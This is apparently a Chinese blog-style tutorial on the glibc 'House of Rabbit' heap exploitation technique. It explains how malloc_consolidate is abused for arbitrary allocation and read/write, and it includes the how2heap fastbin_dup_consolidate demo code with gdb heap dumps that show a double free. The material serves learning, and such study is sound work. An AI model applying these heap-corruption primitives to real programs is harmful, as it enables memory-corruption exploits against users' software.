
* [0] <a href="elink@eecK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6J5L8$3c8W2M7X3W2U0K9$3y4Z5j5h3&6Q4x3X3g2Y4K9i4c8Z5N6h3u0Q4x3X3g2A6L8#2)9J5c8Y4A6Z5i4K6u0V1j5$3&6Q4x3V1j5J5x3o6t1K6i4K6u0V1x3o6u0Q4x3X3b7J5y4#2)9J5k6r3S2G2N6i4y4W2i4K6u0V1L8$3k6Q4x3X3c8S2L8r3I4Q4x3X3c8S2j5X3!0#2N6q4)9J5k6r3N6D9K9h3u0U0i4K6u0V1K9r3g2S2M7q4)9J5k6r3g2^5M7r3I4G2K9i4c8S2N6r3W2G2L8W2)9J5c8W2)9J5x3K6t1$3i4K6u0V1K9r3!0#2M7$3g2Q4x3X3c8G2k6W2)9J5k6s2u0S2j5X3u0A6N6l9`.`.">Glibc堆利用之house of系列总结 - roderick - record and learn! (roderickchan.github.io)</a>

* [1] <a href="elink@8a4K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Z5j5h3y4C8x3i4y4Q4x3X3g2X3N6h3&6Q4x3V1j5J5x3o6t1I4i4K6u0r3x3e0u0Q4x3V1j5I4x3g2)9J5c8X3S2W2j5i4m8D9j5h3u0Q4x3X3c8Z5L8%4g2K6k6g2)9J5k6r3!0X3i4K6u0V1M7X3q4T1j5X3W2@1i4K6u0r3">从零开始的Linux堆利用(十二) House of Rabbit – Hacking everyday (hack1s.fun)</a>

* [2] <a href="elink@510K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6Y4K9i4c8Z5N6h3u0Q4x3X3g2U0L8$3#2Q4x3V1k6K6K9r3g2D9L8s2m8Z5K9i4y4Z5i4K6u0r3K9r3!0%4x3X3S2W2j5i4m8Q4x3V1k6T1L8r3!0T1i4K6u0r3L8h3q4K6N6r3g2J5i4K6u0r3k6$3I4A6j5X3y4Q4y4h3j5J5i4K6u0W2x3K6g2Q4x3V1k6X3j5i4y4@1j5X3W2F1i4K6g2X3k6s2g2H3i4K6g2X3j5$3!0F1M7$3!0D9K9h3c8S2N6r3g2Q4x3X3g2U0">how2heap/glibc_2.35/fastbin_dup_consolidate.c at master · shellphish/how2heap (github.com)</a>

## 简介

> 介绍部分来自参考资料[0]，其余内容参考自 `glibc malloc` 源码，本文结合源码探讨了 `malloc` 中的多种机制：包括 `malloc consolidation`，`unsortedbin sort`，`mmap`，`heap grow` 等

### 漏洞成因

`overflow write`、`use after free`

### 适用范围

- `2.23`——`2.26`

- 超过 `0x400` 大小的堆分配

- 可以写 `fastbin` 的 `fd` 或者 `size` 域

### 利用原理

该利用技巧的核心是 `malloc_consolidate` 函数，当检测到有 `fastbin` 的时候，会取出每一个 `fastbin chunk`，将其放置到 `unsortedbin` 中，并进行合并。以修改 `fd` 为例，利用过程如下：

- 申请 `chunk A`、`chunk B`，其中 `chunk A` 的大小位于 `fastbin` 范围

- 释放 `chunk A`，使其进入到 `fastbin`

- 利用 `use after free`，修改 `A->fd` 指向地址 `X`，需要伪造好 `fake chunk`，使其不执行 `unlink` 或者绕过 `unlink`

- 分配足够大的 `chunk`，或者释放 `0x10000` 以上的 `chunk`，只要能触发 `malloc_consolidate` 即可

- 此时 `fake chunk` 被放到了 `unsortedbin`，或者进入到对应的 `smallbin/largebin`

- 取出 `fake chunk` 进行读写即可

### 相关技巧

- `2.26` 加入了 `unlink` 对 `presize` 的检查

- `2.27` 加入了 `fastbin` 的检查

抓住重点：`house of rabbit` 是对 `malloc_consolidate` 的利用。因此，不一定要按照原作者的思路来，他的思路需要满足的条件太多了。

### 利用效果

- 任意地址分配

- 任意地址读写

## 实验：how2heap - fastbin dup consolidate

实验环境：`libc 2.35`

```c
#include <stdio.h>
#include <stdlib.h>
#include <assert.h>

void main() {
    // reference: 90bK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6$3j5h3I4K6j5h3#2S2M7X3q4K6i4K6u0W2L8h3g2V1K9i4g2E0i4K6u0W2j5$3!0E0i4K6u0r3N6r3S2W2i4K6u0V1N6r3!0V1k6r3I4W2M7Y4y4Q4x3X3c8A6L8Y4c8J5L8$3c8#2j5%4c8A6L8$3&6Q4x3X3c8@1L8#2)9J5k6r3S2W2j5i4m8Q4x3X3c8W2P5s2m8D9L8$3W2@1j5i4c8A6L8$3&6Q4x3X3c8X3j5i4y4@1j5X3W2F1i4K6u0V1k6s2g2H3i4K6u0V1j5$3!0F1M7$3!0D9K9h3c8S2N6r3g2Q4x3X3c8H3j5i4u0@1i4K6u0V1y4q4)9J5k6o6u0Q4x3X3c8U0k6e0k6V1y4U0R3I4x3K6k6S2j5e0R3.
    puts("This is a powerful technique that bypasses the double free check in tcachebin.");
    printf("Fill up the tcache list to force the fastbin usage...\n");

    void *ptr[7];

    for(int i = 0; i < 7; i++)
        ptr[i] = malloc(0x40);
    for(int i = 0; i < 7; i++)
        free(ptr[i]);

    void *p1 = calloc(1, 0x40);

    printf("Allocate another chunk of the same size p1=%p \n", p1);
    printf("Freeing p1 will add this chunk to the fastbin list...\n\n");
    free(p1);

    void *p3 = malloc(0x400);
    printf("Allocating a tcache-sized chunk (p3=%p)\n", p3);
    printf("will trigger the malloc_consolidate and merge\n");
    printf("the fastbin chunks into the top chunk, thus\n");
    printf("p1 and p3 are now pointing to the same chunk !\n\n");

    assert(p1 == p3);

    printf("Triggering the double free vulnerability!\n\n");
    free(p1);

    void *p4 = malloc(0x400);

    assert(p4 == p3);

    printf("The double free added the chunk referenced by p1 \n");
    printf("to the tcache thus the next similar-size malloc will\n");
    printf("point to p3: p3=%p, p4=%p\n\n", p3, p4);
}
```

流程如下：

1. 填充满 `tcachebin`，以便后续使用 `fastbin chunk`

2. 申请同大小的 `chunk` 再释放，使其进入 `fastbin`，指针是 `p1`

   ```
   0x55555555b8d0  0x0000000000000000      0x0000000000000051      ........Q.......         <-- fastbins[0x50][0]
   0x55555555b8e0  0x000000055555555b      0x0000000000000000      [UUU............
   0x55555555b8f0  0x0000000000000000      0x0000000000000000      ................
   0x55555555b900  0x0000000000000000      0x0000000000000000      ................
   0x55555555b910  0x0000000000000000      0x0000000000000000      ................
   0x55555555b920  0x0000000000000000      0x00000000000206e1      ................         <-- Top chunk
   ```

3. 申请一个 `tcache-sized` 的 `chunk p3`，触发 `malloc_consolidate`

   1. 这里会把 `fastbin chunk` 合并到 `top chunk` 中，然后再从 `top chunk` 申请内存

      ```
      0x55555555b8d0  0x0000000000000000      0x0000000000000411      ................    p1 == p3
      0x55555555b8e0  0x000000055555555b      0x0000000000000000      [UUU............
      0x55555555b8f0  0x0000000000000000      0x0000000000000000      ................
      0x55555555b900  0x0000000000000000      0x0000000000000000      ................
      0x55555555b910  0x0000000000000000      0x0000000000000000      ................
      0x55555555b920  0x0000000000000000      0x00000000000206e1      ................
      ```

4. 此时指向 `fastbin` 的指针指向刚刚申请的 `p3`，此时可以再次释放 `p1`，从而对同一个地址连续释放了 2 次，触发了双重释放

5. 当再次申请 `p4` 的时候，位置和 `p3` 依然是一样的

### `malloc_consolidate` 做了哪些事情？

|  |  |
| --- | --- |
